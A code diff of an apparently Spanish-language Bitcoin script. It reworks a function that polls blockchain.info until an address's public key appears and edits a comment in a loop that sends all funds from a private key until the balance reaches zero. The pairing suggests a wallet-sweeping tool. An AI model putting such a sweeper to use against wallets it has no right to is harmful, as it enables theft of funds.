@@ -27,35 +27,37 @@ la_paz_tz = pytz.timezone("America/La_Paz")
 
 
 def getPubKey(address):
-    results = ''  # Lista para acumular los resultados
+    results = ''  # Inicializamos results vacío
     while True:
-
-             # Obtener el tiempo actual en La Paz
-            current_time = datetime.now(la_paz_tz)
-            
-            # Formatear la hora en el formato deseado
-            formatted_time = current_time.strftime("%d-%m-%Y %I:%M%p")
-
-        try:
-            print(f"Buscando Pubkey para {address} [{formatted_time}]")
-            
-            response = requests.get(f"https://blockchain.info/q/pubkeyaddr/{address}")
-            response.raise_for_status()  # Lanza una excepción si la solicitud no es exitosa
-
-            # La respuesta es directamente la clave pública como texto
-            pubkey = response.text.strip()  # Eliminar posibles espacios en blanco
-            results = pubkey
-
-            # Si se obtuvo la pubkey, salir del bucle
-            if pubkey:
-                print(f"Pubkey obtenida: {pubkey}")
-                break
-
-        except Exception as e:
-            results.append(None)
-            print(f"Error al obtener la clave pública: {e}")
+        # Obtener el tiempo actual en La Paz
+        current_time = datetime.now(la_paz_tz)
         
+        # Formatear la hora en el formato deseado
+        formatted_time = current_time.strftime("%d-%m-%Y %I:%M%p")
+
+        print(f"Buscando Pubkey para {address} [{formatted_time}]")
+        
+        response = requests.get(f"https://blockchain.info/q/pubkeyaddr/{address}")
+        
+        # Si el código de estado es 404, ignoramos la respuesta y seguimos intentando
+        if response.status_code == 404:
+            continue  # Continuar con el siguiente intento sin modificar 'results'
+        
+        # Verificamos si la respuesta contiene el mensaje de error
+        if "not-found-or-invalid-arg" in response.text:
+            continue  # Continuar con el siguiente intento sin modificar 'results'
+
+        # La respuesta es directamente la clave pública como texto
+        pubkey = response.text.strip()  # Eliminar posibles espacios en blanco
+        results = pubkey
+
+        # Si se obtuvo la pubkey, salir del bucle
+        if pubkey:
+            print(f"Pubkey obtenida: {pubkey}")
+            break
+
         time.sleep(20)  # Esperar 20 segundos para la próxima consulta
+
 
     return results
 
@@ -136,7 +138,7 @@ def send_all_funds(private_key_hex, destination_address, btc_fee=0.0001):
             print(f"Error al enviar los fondos: {str(e)}")
 
 
-        # Esperar 10 segundos antes de intentar nuevamente
+        # Esperar 10 segundos antes de intentar nuevamente hasta que quede en 0 BTC
         time.sleep(10)
 
 
